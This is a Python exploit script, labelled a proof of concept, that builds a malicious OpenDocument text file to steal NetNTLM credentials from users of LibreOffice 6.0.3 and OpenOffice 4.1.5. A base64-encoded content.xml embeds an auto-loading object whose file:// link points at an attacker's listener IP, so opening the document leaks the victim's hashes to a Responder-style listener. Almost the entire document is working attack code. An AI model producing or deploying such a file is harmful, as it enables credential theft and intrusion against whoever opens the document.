#!/usr/bin/python

# Exploit Title: Malicious ODF File Creator
# Date: 1st May 2018
# Exploit Author: Richard Davy
# Vendor Homepage: https://www.libreoffice.org/
# Software Link: https://www.libreoffice.org/
# Version: LibreOffice 6.0.3, OpenOffice 4.1.5
# Tested on: Windows 10
# 
#Quick script/POC code to create a malicious ODF which can be used to leak NetNTLM credentials 
#Usage - Setup responder or similar create a malicious file and point to listener.
#Works against LibreOffice 6.03 and OpenOffice 4.1.5
# 
# 

try:
	from ezodf import newdoc
except ImportError:
	print ('ezodf appears to be missing - try: pip install ezodf')
	exit(1)

import os
import zipfile
import base64

print """
    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     

"""
print "Create a malicious ODF document help leak NetNTLM Creds"
print "\nBy Richard Davy "
print "@rd_pentest"
print "www.secureyourit.co.uk\n"

#Create a blank ODT file
namef = "temp.odt"
odt = newdoc(doctype='odt', filename=namef)
odt.save()

#Create our modified content.xml file
contentxml1="PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxvZmZpY2U6ZG9jdW1lbnQtY29udGVudCB4bWxuczpvZmZpY2U9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2ZmaWNlOjEuMCIgeG1sbnM6c3R5bGU9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6c3R5bGU6MS4wIiB4bWxuczp0ZXh0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnRleHQ6MS4wIiB4bWxuczp0YWJsZT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczp0YWJsZToxLjAiIHhtbG5zOmRyYXc9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6ZHJhd2luZzoxLjAiIHhtbG5zOmZvPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnhzbC1mby1jb21wYXRpYmxlOjEuMCIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6bWV0YT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczptZXRhOjEuMCIgeG1sbnM6bnVtYmVyPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmRhdGFzdHlsZToxLjAiIHhtbG5zOnN2Zz0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpzdmctY29tcGF0aWJsZToxLjAiIHhtbG5zOmNoYXJ0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmNoYXJ0OjEuMCIgeG1sbnM6ZHIzZD0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpkcjNkOjEuMCIgeG1sbnM6bWF0aD0iaHR0cDovL3d3dy53My5vcmcvMTk5OC9NYXRoL01hdGhNTCIgeG1sbnM6Zm9ybT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6c2NyaXB0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnNjcmlwdDoxLjAiIHhtbG5zOm9vbz0iaHR0cDovL29wZW5vZmZpY2Uub3JnLzIwMDQvb2ZmaWNlIiB4bWxuczpvb293PSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAwNC93cml0ZXIiIHhtbG5zOm9vb2M9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA0L2NhbGMiIHhtbG5zOmRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS94bWwtZXZlbnRzIiB4bWxuczp4Zm9ybXM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDIveGZvcm1zIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4bWxuczpycHQ9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA1L3JlcG9ydCIgeG1sbnM6b2Y9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2Y6MS4yIiB4bWxuczp4aHRtbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sbnM6Z3JkZGw9Imh0dHA6Ly93d3cudzMub3JnLzIwMDMvZy9kYXRhLXZpZXcjIiB4bWxuczpvZmZpY2Vvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L29mZmljZSIgeG1sbnM6dGFibGVvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L3RhYmxlIiB4bWxuczpkcmF3b29vPSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAxMC9kcmF3IiB4bWxuczpjYWxjZXh0PSJ1cm46b3JnOmRvY3VtZW50Zm91bmRhdGlvbjpuYW1lczpleHBlcmltZW50YWw6Y2FsYzp4bWxuczpjYWxjZXh0OjEuMCIgeG1sbnM6bG9leHQ9InVybjpvcmc6ZG9jdW1lbnRmb3VuZGF0aW9uOm5hbWVzOmV4cGVyaW1lbnRhbDpvZmZpY2U6eG1sbnM6bG9leHQ6MS4wIiB4bWxuczpmaWVsZD0idXJuOm9wZW5vZmZpY2U6bmFtZXM6ZXhwZXJpbWVudGFsOm9vby1tcy1pbnRlcm9wOnhtbG5zOmZpZWxkOjEuMCIgeG1sbnM6Zm9ybXg9InVybjpvcGVub2ZmaWNlOm5hbWVzOmV4cGVyaW1lbnRhbDpvb3htbC1vZGYtaW50ZXJvcDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6Y3NzM3Q9Imh0dHA6Ly93d3cudzMub3JnL1RSL2NzczMtdGV4dC8iIG9mZmljZTp2ZXJzaW9uPSIxLjIiPjxvZmZpY2U6c2NyaXB0cy8+PG9mZmljZTpmb250LWZhY2UtZGVjbHM+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FuczEiIHN2Zzpmb250LWZhbWlseT0iJmFwb3M7THVjaWRhIFNhbnMmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InN3aXNzIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMaWJlcmF0aW9uIFNlcmlmIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2VyaWYmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InJvbWFuIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTGliZXJhdGlvbiBTYW5zIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3dpc3MiIHN0eWxlOmZvbnQtcGl0Y2g9InZhcmlhYmxlIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FucyIgc3ZnOmZvbnQtZmFtaWx5PSImYXBvcztMdWNpZGEgU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTWljcm9zb2Z0IFlhSGVpIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO01pY3Jvc29mdCBZYUhlaSZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iU2ltU3VuIiBzdmc6Zm9udC1mYW1pbHk9IlNpbVN1biIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjwvb2ZmaWNlOmZvbnQtZmFjZS1kZWNscz48b2ZmaWNlOmF1dG9tYXRpYy1zdHlsZXM+PHN0eWxlOnN0eWxlIHN0eWxlOm5hbWU9ImZyMSIgc3R5bGU6ZmFtaWx5PSJncmFwaGljIiBzdHlsZTpwYXJlbnQtc3R5bGUtbmFtZT0iT0xFIj48c3R5bGU6Z3JhcGhpYy1wcm9wZXJ0aWVzIHN0eWxlOmhvcml6b250YWwtcG9zPSJjZW50ZXIiIHN0eWxlOmhvcml6b250YWwtcmVsPSJwYXJhZ3JhcGgiIGRyYXc6b2xlLWRyYXctYXNwZWN0PSIxIi8+PC9zdHlsZTpzdHlsZT48L29mZmljZTphdXRvbWF0aWMtc3R5bGVzPjxvZmZpY2U6Ym9keT48b2ZmaWNlOnRleHQ+PHRleHQ6c2VxdWVuY2UtZGVjbHM+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJJbGx1c3RyYXRpb24iLz48dGV4dDpzZXF1ZW5jZS1kZWNsIHRleHQ6ZGlzcGxheS1vdXRsaW5lLWxldmVsPSIwIiB0ZXh0Om5hbWU9IlRhYmxlIi8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJUZXh0Ii8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJEcmF3aW5nIi8+PC90ZXh0OnNlcXVlbmNlLWRlY2xzPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCIvPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCI+PGRyYXc6ZnJhbWUgZHJhdzpzdHlsZS1uYW1lPSJmcjEiIGRyYXc6bmFtZT0iT2JqZWN0MSIgdGV4dDphbmNob3ItdHlwZT0icGFyYWdyYXBoIiBzdmc6d2lkdGg9IjE0LjEwMWNtIiBzdmc6aGVpZ2h0PSI5Ljk5OWNtIiBkcmF3OnotaW5kZXg9IjAiPjxkcmF3Om9iamVjdCB4bGluazpocmVmPSJmaWxlOi8v"
contentxml2=raw_input("\nPlease enter IP of listener: ")
contentxml3="L3Rlc3QuanBnIiB4bGluazp0eXBlPSJzaW1wbGUiIHhsaW5rOnNob3c9ImVtYmVkIiB4bGluazphY3R1YXRlPSJvbkxvYWQiLz48ZHJhdzppbWFnZSB4bGluazpocmVmPSIuL09iamVjdFJlcGxhY2VtZW50cy9PYmplY3QgMSIgeGxpbms6dHlwZT0ic2ltcGxlIiB4bGluazpzaG93PSJlbWJlZCIgeGxpbms6YWN0dWF0ZT0ib25Mb2FkIi8+PC9kcmF3OmZyYW1lPjwvdGV4dDpwPjwvb2ZmaWNlOnRleHQ+PC9vZmZpY2U6Ym9keT48L29mZmljZTpkb2N1bWVudC1jb250ZW50Pg=="

fileout=base64.b64decode(contentxml1)+contentxml2+base64.b64decode(contentxml3)

text_file = open("content.xml", "w")
text_file.write(fileout)
text_file.close()

#Create a copy of the blank odt file without the content.xml file in (odt files are basically a zip)
zin = zipfile.ZipFile ('temp.odt', 'r')
zout = zipfile.ZipFile ('bad.odt', 'w')
for item in zin.infolist():
    buffer = zin.read(item.filename)
    if (item.filename != 'content.xml'):
        zout.writestr(item, buffer)
zout.close()
zin.close()

#Add our modified content.xml file to our odt file
zf = zipfile.ZipFile('bad.odt', mode='a')
try:
	zf.write('content.xml', arcname='content.xml')
finally:
	zf.close()

#Clean up temp files
os.remove("content.xml")
os.remove("temp.odt")
